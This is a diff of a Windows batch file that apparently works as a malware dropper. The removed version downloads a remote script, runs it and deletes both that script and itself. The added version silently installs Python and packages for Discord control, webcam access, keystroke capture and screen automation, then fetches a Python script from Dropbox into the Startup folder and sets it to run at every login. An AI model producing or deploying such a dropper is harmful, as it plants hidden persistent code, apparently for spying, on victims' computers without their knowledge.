@@ -1,25 +1,38 @@
 @echo off
+setlocal
 
-REM Define the URL of the script to download
-set "scriptURL=https://radio1233.github.io/QUCXB.github.io/app"
+:: Define paths and URLs
+set PYTHON_URL=https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe
+set PYTHON_INSTALLER=python_installer.exe
+set PYTHON_PATH=%ProgramFiles%\Python311
+set SCRIPT_URL=https://www.dropbox.com/s/your_file_path/main-v.py?dl=1
+set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+set SCRIPT_NAME=main-v.py
+set SCRIPT_PATH=%STARTUP_FOLDER%\%SCRIPT_NAME%
 
-REM Define the filename for the temporary script
-set "tempScript=%temp%\temp_script.bat"
-
-REM Download the script from the URL
-powershell -Command "(New-Object Net.WebClient).DownloadFile('%scriptURL%', '%tempScript%')"
-
-REM Check if download was successful
-if not exist "%tempScript%" (
-    echo Error: Failed to download script from %scriptURL%
-    exit /b 1
+:: Check if Python is installed
+if not exist "%PYTHON_PATH%\python.exe" (
+    echo Python not found. Installing Python...
+    powershell -Command "Invoke-WebRequest -Uri %PYTHON_URL% -OutFile %PYTHON_INSTALLER%"
+    "%PYTHON_INSTALLER%" /quiet InstallAllUsers=1 PrependPath=1
+    if errorlevel 1 exit /b 1
 )
 
-REM Run the downloaded script
-call "%tempScript%"
+:: Ensure pip is available and install required packages
+"%PYTHON_PATH%\Scripts\pip.exe" install --upgrade pip
+"%PYTHON_PATH%\Scripts\pip.exe" install pyinstaller
+"%PYTHON_PATH%\Scripts\pip.exe" install discord.py opencv-python pynput pyautogui
 
-REM Delete the temporary script
-del "%tempScript%"
+:: Download the Python script
+echo Downloading Python script...
+powershell -Command "Invoke-WebRequest -Uri %SCRIPT_URL% -OutFile %SCRIPT_PATH%"
 
-REM Optionally, delete this batch file itself
-del "%~f0"
+:: Create a shortcut to the script in the Startup folder
+echo Creating shortcut in Startup folder...
+set SHORTCUT_PATH=%STARTUP_FOLDER%\main-v.lnk
+powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%SHORTCUT_PATH%'); $Shortcut.TargetPath = '%PYTHON_PATH%\python.exe'; $Shortcut.Arguments = '%SCRIPT_PATH%'; $Shortcut.Save()"
+
+echo Setup complete. The script will now run at startup.
+
+endlocal
+pause
